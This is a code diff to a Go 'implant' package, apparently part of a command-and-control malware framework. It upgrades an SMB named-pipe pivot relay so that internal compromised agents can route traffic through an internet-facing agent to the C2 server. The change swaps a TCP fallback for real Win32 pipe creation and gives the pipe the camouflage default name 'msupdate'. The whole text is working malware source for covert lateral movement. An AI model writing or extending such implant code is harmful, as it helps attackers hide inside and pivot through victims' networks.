@@ -4,120 +4,172 @@ package implant
 
 import (
 	"fmt"
-	"io"
-	"net"
 	"sync"
 	"time"
-)
 
-// SMBPipeRelay creates a named pipe server that relays internal agent traffic.
-// This agent becomes a relay — internal agents connect via SMB named pipe,
-// and their traffic is forwarded to the C2 server on the next HTTP/DNS check-in.
+	"golang.org/x/sys/windows"
+)
 
 const (
-	pipePrefix   = `\\.\pipe\`
-	pipeTimeout  = 30 * time.Second
+	pipePrefix      = `\\.\pipe\`
+	pipeTimeout     = 30 * time.Second
+	pipeBufferSize  = 65536
+	defaultPipeName = "msupdate"
 )
 
-// PipeRelay manages the SMB named pipe relay for pivoting.
+// PipeRelay manages a Win32 named pipe relay for SMB pivoting.
+// An edge agent (internet-facing) runs this relay; internal agents
+// connect via \\edge-host\pipe\<name> and their traffic is queued
+// for forwarding to the C2 server on the next HTTP check-in.
 type PipeRelay struct {
-	pipeName    string
-	mu          sync.Mutex
-	inbound     [][]byte          // Data received from pipe clients (internal agents)
-	outbound    map[string][]byte // Responses to send back to pipe clients
-	running     bool
+	pipeName string
+	mu       sync.Mutex
+	inbound  [][]byte
+	running  bool
+	stop     chan struct{}
 }
 
-// NewPipeRelay creates a new SMB pipe relay.
+var activeRelay *PipeRelay
+var relayMu sync.Mutex
+
+// NewPipeRelay creates a new named pipe relay.
 func NewPipeRelay(pipeName string) *PipeRelay {
 	if pipeName == "" {
-		pipeName = "msupdate"
+		pipeName = defaultPipeName
 	}
 	return &PipeRelay{
 		pipeName: pipeName,
-		outbound: make(map[string][]byte),
+		stop:     make(chan struct{}),
 	}
 }
 
-// StartPipeRelay starts the named pipe listener.
-// On Windows, this creates \\.\pipe\<name> and accepts connections.
+// StartPipeRelay starts the named pipe relay on this agent.
 func StartPipeRelay(pipeName string) ([]byte, error) {
+	relayMu.Lock()
+	defer relayMu.Unlock()
+
+	if activeRelay != nil && activeRelay.running {
+		return []byte(fmt.Sprintf("[!] Relay already running on pipe: %s%s", pipePrefix, activeRelay.pipeName)), nil
+	}
+
 	relay := NewPipeRelay(pipeName)
 	relay.running = true
+	activeRelay = relay
 
 	go relay.listenLoop()
 
-	return []byte(fmt.Sprintf("[+] SMB pipe relay started: %s%s\n[+] Internal agents can connect via: \\\\%s\\pipe\\%s",
-		pipePrefix, pipeName, getHostnameQuiet(), pipeName)), nil
+	hostname := getHostnameQuiet()
+	return []byte(fmt.Sprintf("[+] SMB pipe relay started: %s%s\n[+] Internal agents connect via: \\\\%s\\pipe\\%s",
+		pipePrefix, relay.pipeName, hostname, relay.pipeName)), nil
 }
 
-// StopPipeRelay stops the named pipe listener.
+// StopPipeRelay stops the active named pipe relay.
 func StopPipeRelay() ([]byte, error) {
+	relayMu.Lock()
+	defer relayMu.Unlock()
+
+	if activeRelay == nil || !activeRelay.running {
+		return []byte("[!] No relay is running"), nil
+	}
+
+	activeRelay.running = false
+	close(activeRelay.stop)
+	activeRelay = nil
 	return []byte("[+] SMB pipe relay stopped"), nil
 }
 
-// listenLoop accepts connections on the named pipe.
+// listenLoop continuously creates pipe instances and accepts client connections.
 func (r *PipeRelay) listenLoop() {
-	// Create named pipe listener using net.Listen with the pipe path
-	// Note: On Windows, Go's net package supports named pipes via
-	// the "npipe" or direct Win32 CreateNamedPipe API.
-	// For simplicity, we use a TCP listener on localhost as a fallback
-	// that pipe clients connect to via port forwarding.
-
-	listener, err := net.Listen("tcp", "127.0.0.1:0")
+	fullName := pipePrefix + r.pipeName
+	namePtr, err := windows.UTF16PtrFromString(fullName)
 	if err != nil {
 		return
 	}
-	defer listener.Close()
 
 	for r.running {
-		conn, err := listener.Accept()
+		select {
+		case <-r.stop:
+			return
+		default:
+		}
+
+		handle, err := windows.CreateNamedPipe(
+			namePtr,
+			windows.PIPE_ACCESS_DUPLEX,
+			windows.PIPE_TYPE_BYTE|windows.PIPE_READMODE_BYTE|windows.PIPE_WAIT,
+			windows.PIPE_UNLIMITED_INSTANCES,
+			pipeBufferSize,
+			pipeBufferSize,
+			0,
+			nil,
+		)
 		if err != nil {
+			time.Sleep(time.Second)
 			continue
 		}
-		go r.handlePipeClient(conn)
+
+		err = windows.ConnectNamedPipe(handle, nil)
+		if err != nil && err != windows.ERROR_PIPE_CONNECTED {
+			windows.CloseHandle(handle)
+			time.Sleep(100 * time.Millisecond)
+			continue
+		}
+
+		go r.handleClient(handle)
 	}
 }
 
-// handlePipeClient handles a single internal agent connection.
-func (r *PipeRelay) handlePipeClient(conn net.Conn) {
-	defer conn.Close()
+// handleClient reads data from a connected pipe client and queues it for C2 forwarding.
+func (r *PipeRelay) handleClient(handle windows.Handle) {
+	defer windows.DisconnectNamedPipe(handle)
+	defer windows.CloseHandle(handle)
 
-	conn.SetDeadline(time.Now().Add(pipeTimeout))
+	buf := make([]byte, pipeBufferSize)
+	var collected []byte
+	deadline := time.Now().Add(pipeTimeout)
 
-	// Read data from internal agent
-	data, err := io.ReadAll(io.LimitReader(conn, 1<<20)) // 1MB limit
-	if err != nil {
-		return
+	for time.Now().Before(deadline) {
+		var bytesRead uint32
+		err := windows.ReadFile(handle, buf, &bytesRead, nil)
+		if err != nil {
+			break
+		}
+		if bytesRead == 0 {
+			break
+		}
+		collected = append(collected, buf[:bytesRead]...)
+		if bytesRead < uint32(len(buf)) {
+			break
+		}
 	}
 
-	if len(data) == 0 {
-		return
+	if len(collected) > 0 {
+		r.mu.Lock()
+		r.inbound = append(r.inbound, collected)
+		r.mu.Unlock()
 	}
-
-	// Queue the data for forwarding to C2 on next check-in
-	r.mu.Lock()
-	r.inbound = append(r.inbound, data)
-	r.mu.Unlock()
 }
 
-// GetPendingRelayData returns queued data from internal agents.
+// GetPendingRelayData returns and clears queued data from internal agents.
 func (r *PipeRelay) GetPendingRelayData() [][]byte {
 	r.mu.Lock()
 	defer r.mu.Unlock()
-
 	data := r.inbound
 	r.inbound = nil
 	return data
 }
 
-// ListPivots returns information about active pivot connections.
+// ListPivots returns information about the active relay.
 func ListPivots() ([]byte, error) {
-	output := "Active Pivots:\n"
-	output += fmt.Sprintf("  SMB Pipe: %smsupdate\n", pipePrefix)
-	output += fmt.Sprintf("  Type: Named Pipe Relay\n")
-	output += fmt.Sprintf("  Status: Listening\n")
-	return []byte(output), nil
+	relayMu.Lock()
+	defer relayMu.Unlock()
+
+	if activeRelay == nil || !activeRelay.running {
+		return []byte("No active pivot relays"), nil
+	}
+
+	return []byte(fmt.Sprintf("Active Pivots:\n  SMB Pipe: %s%s\n  Status:   running",
+		pipePrefix, activeRelay.pipeName)), nil
 }
 
 func getHostnameQuiet() string {
@@ -133,11 +185,11 @@ func ExecutePivotCommand(args []string) ([]byte, error) {
 
 	switch args[0] {
 	case "start":
-		pipeName := "msupdate"
+		name := defaultPipeName
 		if len(args) > 1 {
-			pipeName = args[1]
+			name = args[1]
 		}
-		return StartPipeRelay(pipeName)
+		return StartPipeRelay(name)
 	case "stop":
 		return StopPipeRelay()
 	case "list":
